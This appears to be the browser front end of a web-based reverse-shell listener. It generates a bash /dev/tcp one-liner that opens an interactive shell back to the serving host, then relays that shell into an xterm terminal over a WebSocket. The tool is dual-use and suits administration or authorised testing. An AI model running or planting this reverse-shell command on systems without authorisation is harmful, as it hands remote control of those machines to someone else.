import { Terminal } from 'xterm'

delete (async () => {

const state = {
  connection: void 0,
}

const getCommand = (data) => {
  return (
    `bash -c 'exec<>/dev/tcp/${location.hostname}/${data.port};` +
    `echo>&0 ${data.id};$0 -i<&0 >&0 2>&0'`
  )
}

const element = document.querySelector('.terminal')
const terminal = new Terminal({ convertEol: true })
terminal.open(element)

const result = await fetch('/start', { method: 'POST' })
const data = await result.json()

terminal.write(getCommand(data))

const wsUrl = new URL(location)
wsUrl.protocol = wsUrl.protocol.replace('http', 'ws')
wsUrl.pathname = `/connect/${data.id}`
state.connection = new WebSocket(wsUrl)
state.connection.addEventListener('message', async (event) => {
  const data = await event.data.text()
  console.log(data)
  terminal.write(data)
})

terminal.onData((e) => {
  state.connection.send(e)
})

})()
